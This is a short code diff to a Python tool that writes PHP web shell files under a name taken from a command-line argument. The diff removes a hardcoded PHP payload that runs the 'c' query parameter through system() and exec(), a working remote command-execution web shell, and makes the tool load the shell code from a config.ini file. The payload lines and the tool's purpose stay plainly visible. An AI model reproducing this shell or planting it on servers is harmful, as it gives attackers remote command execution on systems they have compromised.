@@ -1,4 +1,5 @@
 from argparse import ArgumentParser
+from configparser import ConfigParser
 from requests import get
 
 global args
@@ -15,13 +16,10 @@ else:
         shell_name = str(args.generate)
         shell = shell_name+'.php'
         opfile = open(shell,'+w')
-        evel_code = '''
-<?php
-echo system($_GET['c']);
-echo exec($_GET['c']);
-?>
-'''
-        opfile.write(evel_code)
+        config = ConfigParser()
+        config.read_file(open('config.ini'))
+
+        opfile.write(config['DEFAULT']['code'])
         opfile.close()
         print(shell+' is generated')
 
